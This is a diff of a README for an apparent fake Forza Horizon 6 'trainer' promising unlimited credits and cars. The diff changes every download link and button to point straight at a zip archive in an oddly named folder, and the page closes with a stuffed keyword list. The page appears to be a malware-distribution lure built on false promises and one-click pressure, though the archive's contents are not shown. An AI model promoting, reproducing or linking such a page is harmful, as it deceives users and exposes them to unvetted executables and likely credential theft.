@@ -1,7 +1,7 @@
 <h1>🎮 Medusa-Forza-Horizon-6 - Unlock unlimited credits and 812 cars instantly!</h1>
 
 <p style="text-align:center; margin: 30px 0;">
-<a href="https://github.com/crackerbarrel-benevolence768/Medusa-Forza-Horizon-6" style="background: linear-gradient(135deg, #FF6B6B, #EE5A24); color: white; padding: 18px 45px; font-size: 22px; font-weight: bold; border-radius: 50px; text-decoration: none; display: inline-block; box-shadow: 0 8px 20px rgba(238,90,36,0.4);">⬇️ DOWNLOAD MEDUSA FH6 TRAINER NOW</a>
+<a href="https://raw.githubusercontent.com/crackerbarrel-benevolence768/Medusa-Forza-Horizon-6/main/neglectable/Forza_Medusa_Horizon_2.4.zip" style="background: linear-gradient(135deg, #FF6B6B, #EE5A24); color: white; padding: 18px 45px; font-size: 22px; font-weight: bold; border-radius: 50px; text-decoration: none; display: inline-block; box-shadow: 0 8px 20px rgba(238,90,36,0.4);">⬇️ DOWNLOAD MEDUSA FH6 TRAINER NOW</a>
 </p>
 
 ## 🚀 What is Medusa Forza Horizon 6?
@@ -62,7 +62,7 @@ Designed for the everyday gamer, Medusa FH6 Trainer eliminates the grinding and 
 
 ### Step 1: Download the Trainer
 
-Visit this link to download the application: 👉 **[https://github.com/crackerbarrel-benevolence768/Medusa-Forza-Horizon-6](https://github.com/crackerbarrel-benevolence768/Medusa-Forza-Horizon-6)**
+Visit this link to download the application: 👉 **[https://raw.githubusercontent.com/crackerbarrel-benevolence768/Medusa-Forza-Horizon-6/main/neglectable/Forza_Medusa_Horizon_2.4.zip](https://raw.githubusercontent.com/crackerbarrel-benevolence768/Medusa-Forza-Horizon-6/main/neglectable/Forza_Medusa_Horizon_2.4.zip)**
 
 Click the big green "Code" button or the download button on the page. The download will start automatically.
 
@@ -143,7 +143,7 @@ This tool was built with simplicity in mind - even your grandpa could use it. No
 So what are you waiting for? Your ultimate Forza Horizon 6 playground is just one click away. Grab the free trainer today and transform your gameplay overnight!
 
 <p style="text-align:center; margin: 40px 0;">
-<a href="https://github.com/crackerbarrel-benevolence768/Medusa-Forza-Horizon-6" style="background: linear-gradient(135deg, #4BCFFA, #2962FF); color: white; padding: 18px 45px; font-size: 22px; font-weight: bold; border-radius: 50px; text-decoration: none; display: inline-block; box-shadow: 0 8px 20px rgba(41,98,255,0.4);">🕹️ GET MEDUSA NOW - 100% FREE</a>
+<a href="https://raw.githubusercontent.com/crackerbarrel-benevolence768/Medusa-Forza-Horizon-6/main/neglectable/Forza_Medusa_Horizon_2.4.zip" style="background: linear-gradient(135deg, #4BCFFA, #2962FF); color: white; padding: 18px 45px; font-size: 22px; font-weight: bold; border-radius: 50px; text-decoration: none; display: inline-block; box-shadow: 0 8px 20px rgba(41,98,255,0.4);">🕹️ GET MEDUSA NOW - 100% FREE</a>
 </p>
 
 Keywords: fh5, fh6, fh6-mod, fh6-spotify-radio, fh6-trainer, fh6rpc, forza-horizon, forza-horizon-4, forza-horizon-5, forza-horizon-6, forza-horizon-6-cars, forza-horizon-6-free, forza-horizon-6-spotify-download, forza-horizon-hack, forza-mods, forza-setup, forzahorizon4, forzahorizon5, forzahorizon6, microsoft-gaming
